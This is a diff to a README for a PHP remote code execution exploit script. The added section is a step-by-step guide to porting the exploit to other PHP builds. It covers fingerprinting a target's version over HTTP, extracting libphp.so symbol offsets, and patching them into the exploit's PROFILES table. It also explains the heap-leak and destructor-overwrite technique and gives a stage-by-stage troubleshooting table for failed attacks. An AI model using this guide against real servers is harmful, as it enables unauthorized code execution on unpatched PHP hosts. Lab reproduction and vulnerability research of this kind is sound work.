@@ -142,22 +142,164 @@ docker rm -f p2s-pure-18110
 
 ## Multi-version support
 
-The exploit offsets (`zval_ptr_dtor`, `zif_system`) are build-specific -- they change with every PHP rebuild. The default profile in `phppoc2.py` targets **PHP 8.4.26 x86_64 on Debian 13 trixie** (the stock `php:8.4.26-apache` Docker image).
+The exploit's hardcoded offsets are specific to a single PHP build. Out of the box, `phppoc2.py` only works against **PHP 8.4.26 x86_64 on Debian 13 trixie** (the stock `php:8.4.26-apache` Docker image). To target a different vulnerable PHP version, you need to extract that build's symbol offsets and patch them into the exploit.
 
-For other vulnerable versions, you need to extract the correct symbol offsets from that build's `libphp.so`:
+### Why offsets matter
+
+The exploit needs two addresses inside `libphp.so`:
+
+| Symbol | What it does in the exploit |
+|---|---|
+| `zval_ptr_dtor` | Its address appears repeatedly in heap-allocated HashTables. The leak stage (B1) reads raw heap memory via the oversized `Set-Cookie`, and the exploit identifies `zval_ptr_dtor` pointers by frequency analysis. From this address, it calculates `libphp.so`'s base address using the formula: `libphp_base = leaked_zval_ptr_dtor - dtor_offset` |
+| `zif_system` | The address of PHP's internal `system()` implementation. The exploit overwrites a HashTable's `pDestructor` function pointer with this address, so when PHP cleans up the table it calls `system(cmd)` instead. Calculated as: `zif_system = libphp_base + zif_offset` |
+
+Every PHP rebuild (different version, different OS, different compiler flags) places these symbols at different offsets inside `libphp.so`. Using wrong offsets = the exploit will crash the worker instead of getting RCE.
+
+### Step 1: Identify the target PHP version
+
+Find out what PHP version and architecture the target is running:
 
 ```bash
-# Inside a container of the target version:
-readelf -Ws /usr/local/lib/apache2/modules/libphp.so | grep -wE 'zval_ptr_dtor|zif_system'
+# If you have HTTP access:
+curl -sI http://target/ | grep X-Powered-By
+# -> X-Powered-By: PHP/8.4.25
 
-# Example output (PHP 8.4.26 x86_64):
-#  5765: 000000000065eb60   123 FUNC  GLOBAL DEFAULT  14 zval_ptr_dtor
-#  8832: 0000000000465370    85 FUNC  GLOBAL DEFAULT  14 zif_system
+# Or from phpinfo() if available:
+curl -s http://target/info.php | grep -oP 'PHP Version \K[0-9.]+'
 ```
 
-**Same minor version** (e.g., 8.4.25 vs 8.4.26) -- only the symbol offsets change. Heap layout constants are typically identical between patch releases.
+Confirm the version is vulnerable (see [Affected versions](#affected-versions)). If it's patched, the exploit won't work.
 
-**Different minor version** (e.g., 8.3.x vs 8.4.x) -- both symbol offsets AND heap geometry constants (`S`, `hsv`, shaping parameters) may differ. If the leak stage (B1) succeeds but RCE (B2) fails, the heap layout needs recalibration for that version.
+### Step 2: Get the matching Docker image
+
+You need the exact same `libphp.so` binary as the target. For targets running the official PHP Docker images, this is straightforward:
+
+```bash
+# Pull the matching image (replace 8.4.25 with the target version)
+docker pull php:8.4.25-apache
+
+# Start a temporary container
+docker run -d --name offset-extract php:8.4.25-apache
+```
+
+> **Note:** If the target is running a custom-compiled PHP (not the official Docker image), the offsets will be different even for the same version number. You need a copy of that specific `libphp.so` binary. Extract it from the target if possible, or replicate their exact build environment.
+
+### Step 3: Extract the symbol offsets
+
+Run `readelf` inside the container to find the two symbol offsets:
+
+```bash
+docker exec offset-extract \
+  readelf -Ws /usr/local/lib/apache2/modules/libphp.so \
+  | grep -wE 'zval_ptr_dtor|zif_system'
+```
+
+Example output for PHP 8.4.26 x86_64:
+
+```
+  5765: 000000000065eb60   123 FUNC    GLOBAL DEFAULT   14 zval_ptr_dtor
+  8832: 0000000000465370    85 FUNC    GLOBAL DEFAULT   14 zif_system
+```
+
+The offsets you need are in the **second column** (the hex values):
+- `zval_ptr_dtor` → `0x65EB60`
+- `zif_system` → `0x465370`
+
+Clean up when done:
+
+```bash
+docker rm -f offset-extract
+```
+
+### Step 4: Determine the architecture
+
+Check whether the target is x86_64 or aarch64:
+
+```bash
+docker exec offset-extract uname -m
+# -> x86_64  or  aarch64
+```
+
+This determines which profile block to edit in the next step.
+
+### Step 5: Patch the offsets into phppoc2.py
+
+Open `phppoc2.py` and find the `PROFILES` dictionary near the top (around line 43):
+
+```python
+PROFILES = {
+    "x86_64": {
+        "dtor_offset": 0x65EB60,    # <-- replace with your zval_ptr_dtor offset
+        "zif_offset": 0x465370,     # <-- replace with your zif_system offset
+        "ptr_max": 0x7FFFFFFFFFFF,
+        "delta_min": 0x1A00000,
+        "delta_max": 0x1F00000,
+    },
+    "aarch64": {
+        "dtor_offset": 0x63812B,    # <-- replace with your zval_ptr_dtor offset
+        "zif_offset": 0x42CD70,     # <-- replace with your zif_system offset
+        "ptr_max": 0xFFFFFFFFFFFF,
+        "delta_min": 0x1F00000,
+        "delta_max": 0x2300000,
+    },
+}
+```
+
+Replace `dtor_offset` with your `zval_ptr_dtor` value, and `zif_offset` with your `zif_system` value, in the correct architecture block.
+
+**Leave `ptr_max`, `delta_min`, and `delta_max` unchanged** -- these are architecture-specific heap geometry constants, not symbol offsets. They are the same across patch releases of the same minor version.
+
+### Step 6: Test in a lab
+
+Always validate against a local Docker container before pointing at a real target:
+
+```bash
+# Start vulnerable target (replace version as needed)
+docker run -d \
+    --name p2s-test \
+    -p 127.0.0.1:18110:80 \
+    -v "$PWD/pure/docker/www:/var/www/html:ro" \
+    -v "$PWD/out:/out" \
+    php:8.4.25-apache \
+    /bin/sh -c 'cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini; \
+                chown -R www-data:www-data /out; \
+                exec apache2-foreground'
+
+# Wait for Apache to start
+sleep 2
+curl -s http://127.0.0.1:18110/index.php
+# -> OK
+
+# Run the exploit
+mkdir -p out
+python3 phppoc2.py --port 18110
+
+# Check proof of RCE
+cat out/p1
+# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Cleanup
+docker rm -f p2s-test
+```
+
+### Troubleshooting by stage
+
+If the exploit fails, note which stage it stops at:
+
+| Failure point | Symptom | Likely cause | Fix |
+|---|---|---|---|
+| **A1 (OOM trigger)** | No error, but B1 gets no leak | `memory_limit` is not 128M, or multipart depth is being stripped by a reverse proxy | Check `php.ini` memory_limit; test without proxy |
+| **B1 (Heap leak)** | `no Set-Cookie in leak response` | OOM didn't trigger correctly, or `session.upload_progress.enabled = 0` | Verify session.upload_progress is on (it's on by default) |
+| **B1 (Heap leak)** | `no heap pointers in leak window` | ASLR randomized to unexpected range, or wrong architecture selected | Retry (ASLR), or set `--arch` explicitly |
+| **B1 → B2 gap** | `implausible libphp-main delta` | Wrong `dtor_offset` — the libphp base calculation is wrong, so the delta between libphp and the main heap chunk falls outside the expected range | Re-extract offsets from the exact same binary as the target |
+| **B2 (RCE)** | `candidate failed (no proof)` on all retries | Wrong `zif_offset`, or heap layout differs (different minor version) | Re-extract offsets; if different minor version, `delta_min`/`delta_max` may need tuning |
+| **B2 (RCE)** | Segfault / worker crash in Apache logs | Offsets are wrong, or heap geometry (`S` constant at line 261) doesn't match this PHP version | Confirm you're using offsets from the identical `libphp.so` binary |
+
+### Same minor version vs. different minor version
+
+**Same minor version** (e.g., 8.4.25 vs 8.4.26) — only Steps 3-5 are needed. The heap layout constants (`delta_min`, `delta_max`, `MAIN_BUCKET_COUNT`, the `S` offset at line 261) are typically identical between patch releases within 8.4.x. Just swap the two symbol offsets and the exploit should work.
+
+**Different minor version** (e.g., 8.3.x vs 8.4.x) — the heap geometry may differ. If B1 (leak) succeeds but B2 (RCE) consistently fails with `candidate failed`, the `S` heap offset (line 261: `S = cand + 0xF8398`) and/or `delta_min`/`delta_max` need recalibration for that version's allocator behavior. This requires heap analysis with gdb — see the `.gdb` scripts in the upstream repo for reference.
 
 ## Affected versions
 
